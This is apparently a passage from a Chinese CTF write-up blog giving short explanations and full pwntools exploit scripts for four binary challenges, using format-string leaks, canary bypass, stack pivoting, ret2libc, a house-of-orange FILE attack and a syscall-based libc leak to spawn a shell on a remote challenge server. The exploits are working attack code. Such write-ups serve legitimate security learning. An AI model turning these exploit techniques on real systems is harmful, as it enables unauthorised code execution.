href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h4><p>非常恶心，格串+canary绕过+ret2libc+栈迁移。首先利用格串漏洞把程序基地址、libc基地址、栈地址、canary值全部leak出来，此时main函数的canary已损坏，不过我们一会儿可以打栈迁移绕过检查，不必理会；接下来利用vuln函数里的off-by-one，覆盖rbp指向的位置的低字节，实现栈迁移，这样就可以劫持控制流重启main了。接下来就常规ret2libc打通即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">26250</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;By the way, can you tell me your name before that?\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>get_canary = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">b&quot;%29$p&quot;</span> + <span class="hljs-string">b&quot;%15$p&quot;</span> + <span class="hljs-string">b&quot;%13$p&quot;</span> + <span class="hljs-string">b&quot;%11$p&quot;</span> + <span class="hljs-string">b&quot;0x\x00&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;Great, I&#x27;ve decided to give you a gift!\n&quot;</span>, get_canary)<br>io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;canary&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br>stack = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>) - <span class="hljs-number">0x160</span><br>log.success(<span class="hljs-string">f&quot;stack&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stack)&#125;</span>&quot;</span>)<br>main = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;main&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(main)&#125;</span>&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>) <br>log.success(<span class="hljs-string">f&quot;libc_start&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br>libc_base = libc_base - libc.sym[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">128</span>+<span class="hljs-number">176</span><br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = pop_rdi+<span class="hljs-number">1</span><br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;puts&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>off = stack&amp;<span class="hljs-number">0xff</span><br><br><br>payload1 = p64(canary) + <span class="hljs-string">b&quot;e&quot;</span>*<span class="hljs-number">8</span> + p64(main) + p64(canary) + p8(off)<br>io.recvuntil(<span class="hljs-string">b&quot;again?????\n&quot;</span>)<br>sleep(<span class="hljs-number">3</span>)<br>io.send(payload1)<br><br><br>payload2 = <span class="hljs-string">b&quot;c&quot;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">0x8</span>)<br>payload2 += p64(canary)+ <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span> \<br>+ p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;By the way, can you tell me your name before that?\n&quot;</span>, \<br>    payload2)<br>io.sendafter(<span class="hljs-string">b&quot;Great, I&#x27;ve decided to give you a gift!\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;again?????\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h4><p>ByteCTF2024原题，只不过去了符号表、加了花指令。nop掉花指令后分析，发现没有free，考虑<code>house of orange</code>攻击，利用unsorted bin泄露libc和堆地址后打IO即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>    p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>    p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():<br>    <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">32784</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>menu = <span class="hljs-string">b&quot;Enter \n&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;1&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size\n&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;3&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;index\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size, payload:<span class="hljs-built_in">bytes</span></span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;4&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;index\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;size\n&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;input\n&quot;</span>, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#0</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x110</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(<span class="hljs-number">0xca1</span>))<br>    add(<span class="hljs-number">0x1000</span>)<span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0xc70</span>)<span class="hljs-comment">#2</span><br>    show(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;2: &#x27;</span>)<br>    libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3ebca0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>    stdout = libc.address+<span class="hljs-number">0x3ec760</span><br>    wfile_jump = libc.address+<span class="hljs-number">0x3e7d60</span><br>    add(<span class="hljs-number">0xdb0</span>)<span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#4</span><br>    edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x211</span>))<br>    add(<span class="hljs-number">0xdc0</span>)<span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#6</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x211</span>))<br>    add(<span class="hljs-number">0x1000</span>)<span class="hljs-comment">#7</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x1f1</span>)+p64(stdout))<br>    fake_io = flat(&#123;<br>        <span class="hljs-number">0x0</span>: <span class="hljs-string">b&#x27; sh&#x27;</span>,<br>        <span class="hljs-number">0xa0</span>: p64(stdout-<span class="hljs-number">0x130</span>+<span class="hljs-number">0xd8</span>),<br>        <span class="hljs-number">0x10</span>: p64(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        <span class="hljs-number">0x20</span>: p64(stdout),<br>        <span class="hljs-number">0x98</span>: p64(stdout-<span class="hljs-number">0x20</span>+<span class="hljs-number">0x80</span>),<br>        <span class="hljs-number">0xd8</span>: p64(wfile_jump + <span class="hljs-number">0x48</span> - <span class="hljs-number">0x38</span>),<br>        <span class="hljs-number">0x60</span>: <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>,<br>        <span class="hljs-number">0x80</span>: p64(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        <span class="hljs-number">0x88</span>: p64(stdout - <span class="hljs-number">0x30</span>),<br>        <span class="hljs-number">0xe0</span>: p64(stdout - <span class="hljs-number">8</span>),<br>    &#125;, filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    add(<span class="hljs-number">0x1e0</span>)<span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">0x1e0</span>)<span class="hljs-comment">#9</span><br>    edit(<span class="hljs-number">9</span>,<span class="hljs-built_in">len</span>(fake_io),fake_io)<br>    p.interactive()<br>pwn()<br></code></pre></td></tr></table></figure><h4 id="小蓝鲨stack"><a href="#小蓝鲨stack" class="headerlink" title="小蓝鲨stack"></a>小蓝鲨stack</h4><p>ret2libc板子。注意printf需要栈对齐，也包括重启main后的printf，需要用ret对齐。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main&quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">36450</span>)<br>main = <span class="hljs-number">0x4011df</span><br>puts_got = e.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x401293</span><br>ret = <span class="hljs-number">0x401294</span><br><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(puts_got) \<br>    +p64(ret) +p64(puts_plt) + p64(ret)+ p64(main) <br>io.send(payload)<br>io.recvuntil(<span class="hljs-string">b&quot;\x40&quot;</span>)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;printf&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(binsh_addr) \<br>    + p64(ret) + p64(system_addr)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h4><p>给了3次syscall的机会，利用<code>shmget</code>+<code>shmat</code>leak libc，拿出<code>/bin/sh</code>地址，再<code>execve</code>即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+64)</span><br><span class="hljs-comment">#                b *(*main+312)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">20415</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;29&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;1000&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;8630&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;30&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;result:&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;RAX: &quot;</span>)<br>printf_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;000&quot;</span>).decode()[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>) - <span class="hljs-number">2144528</span> + <span class="hljs-number">0xa000</span><br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr+<span class="hljs-number">2144528</span>-<span class="hljs-number">0xa000</span>)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)<br>libc_base = printf_addr - libc.sym[<span class="hljs-string">&quot;printf&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>payload = <span class="hljs-built_in">str</span>(binsh_addr).encode()<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;59&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, payload)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
